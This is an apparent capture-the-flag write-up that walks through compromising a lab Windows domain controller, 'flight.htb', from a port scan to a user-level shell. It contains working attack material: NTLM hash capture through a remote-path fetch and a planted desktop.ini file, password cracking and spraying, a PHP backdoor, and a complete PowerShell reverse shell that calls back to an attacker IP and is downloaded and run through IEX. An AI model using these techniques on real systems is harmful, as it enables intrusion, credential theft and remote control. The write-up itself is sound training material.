TCP SCAN
> TARGET=10.129.69.58 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-11-06 14:28:59Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52871/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Domain found: flight.htb
WEB ENUM
Subdomain enum
> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154

000000624:   200        90 L     412 W      3996 Ch     "school"
Browsing to the subdomain found a url parameter: http://school.flight.htb/index.php?view=home.html
First suspicion, this may be vulnerable to LFI.
After a bit enum, found an error output when browsed to http://school.flight.htb/index.php?view=index.php. Then inspect the source code found the following php code in the source.
<?php
ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
?>
The url validation part prevents us from doing LFI. But we can use this code to force the service to fetch a remote source using Windows network share syntax: //ip>/<share> and attempt to capture the hash of a service.
CAPTURE SERVICE ACCOUNT HASH
A service account svc_apache and its ntlm hash can be captured
# In browser
> http://school.flight.htb/index.php?view=//<ip>/test

# In kali
> responder -I tun0 -wP

[SMB] NTLMv2-SSP Client   : 10.129.69.58
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:8f18f6aaeb23aaca:<hash>:<hash>
Crack the hash using hashcat: S*********3
> hashcat.exe --force -m 5600 hash.txt rockyou.txt
SMB ENUM
From above, we have captured a credential that can be used to access SMB. Then enum SMB
# List shares
> smbclient -L //flight.htb/ -U svc_apache

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Shared          Disk      
SYSVOL          Disk      Logon server share 
Users           Disk      
Web             Disk

# Users share
> smbclient //flight.htb/Users -U svc_apache
lpcfg_do_global_parameter: WARNING: The "syslog" option is deprecated
Password for [WORKGROUP\svc_apache]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Sep 22 16:16:56 2022
  ..                                 DR        0  Thu Sep 22 16:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 15:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 15:28:02 2022
  Administrator                       D        0  Mon Oct 31 14:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  C.Bum                               D        0  Thu Sep 22 16:08:23 2022
  Default                           DHR        0  Tue Jul 20 15:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  Public                             DR        0  Tue Jul 20 15:23:25 2021
  svc_apache                          D        0  Fri Oct 21 14:50:21 2022
AD ENUM
Perform enum on SMB using the previously obtained credential
> ~/tools/cme/cme smb flight.htb -u svc_apache -p 'S*********3' --users                            
SMB    flight.htb      445    G0     flight.htb\O.Possum          badpwdcount: 0 desc: Helpdesk
SMB    flight.htb      445    G0     flight.htb\svc_apache        badpwdcount: 0 desc: Service Apache web
SMB    flight.htb      445    G0     flight.htb\V.Stevens         badpwdcount: 0 desc: Secretary
SMB    flight.htb      445    G0     flight.htb\D.Truff           badpwdcount: 0 desc: Project Manager
SMB    flight.htb      445    G0     flight.htb\I.Francis         badpwdcount: 0 desc: Nobody knows why he's here
SMB    flight.htb      445    G0     flight.htb\W.Walker          badpwdcount: 0 desc: Payroll officer
SMB    flight.htb      445    G0     flight.htb\C.Bum             badpwdcount: 1 desc: Senior Web Developer
SMB    flight.htb      445    G0     flight.htb\M.Gold            badpwdcount: 0 desc: Sysadmin
SMB    flight.htb      445    G0     flight.htb\L.Kein            badpwdcount: 0 desc: Penetration tester
SMB    flight.htb      445    G0     flight.htb\G.Lors            badpwdcount: 0 desc: Sales manager
SMB    flight.htb      445    G0     flight.htb\R.Cold            badpwdcount: 0 desc: HR Assistant
SMB    flight.htb      445    G0     flight.htb\S.Moon            badpwdcount: 0 desc: Junion Web Developer
Using a similar approach, we learnt that another user s.moon is using the same password as svc_apache
> ~/tools/cme/cme smb flight.htb -u users.txt -p 'S*********3' --continue-on-success
SMB    flight.htb      445    G0     [-] flight.htb\O.Possum:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [+] flight.htb\svc_apache:S*********3 
SMB    flight.htb      445    G0     [-] flight.htb\V.Stevens:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\D.Truff:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\I.Francis:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\W.Walker:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\C.Bum:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\M.Gold:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\L.Kein:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\G.Lors:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [-] flight.htb\R.Cold:S*********3 STATUS_LOGON_FAILURE 
SMB    flight.htb      445    G0     [+] flight.htb\S.Moon:S*********3
USER: C.BUM
Using impacket-smbexec, we can find out which share is writable. But there seems to be customised code that prevents a lot of file types to be written: Shared
> impacket-psexec flight.htb/s.moon@g0.flight.htb
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on g0.flight.htb.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[*] Found writable share Shared
[*] Uploading file UCspwDOu.exe
[-] Error uploading file UCspwDOu.exe, aborting.....
[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
Create a desktop.ini file with the following content. For more detail, refer to https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
[.ShellClassInfo]
IconResource=\\<ip>\test
Then upload this file to smb: Shared. Then setup responder again and wait for an autobot to trigger the file load to capture c.bum hash.
# upload desktop.ini
> smbclient //flight.htb/shared -U s.moon
> put desktop.ini

# listen for hash
> responder -I tun0 -wF -v
Crack c.bum’s password: T*****************4
> hashcat.exe --force -m 5600 hash.txt rockyou.txt
You can now smb as c.bum to share: Users and capture the user flag
REVERSE-SHELL: C.BUM
c.bum user can write to the share: Web
Create a simple php backdoor under web/school.flight.htb
> /usr/share/webshells/php/simple-backdoor.php
# upload it to smb
Prepare a powershell reverse shell and serve it with http
$client = New-Object System.Net.Sockets.TCPClient("<ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
Trigger the shell via browser and listen with nc
> http://school.flight.htb/w.php?cmd=powershell.exe+IEX(New-Object%20Net.WebClient).DownloadString(%27http://<ip>/shell.ps1%27)
You should receive a reverse shell as svc_apache
Switch to c.bum using runascs: https://github.com/antonioCoco/RunasCs/tree/master
# upload Runascs.exe, then setup a listener
# it's more convenient to run two sessions as c.bum for later your'll find out (one for pivot, another for operation)
> certutil.exe -urlcache -f http://<ip>/RunasCs.exe RunasCs.exe
> .\Runascs.exe c.bum T*****************4 powershell -r <ip>:5555
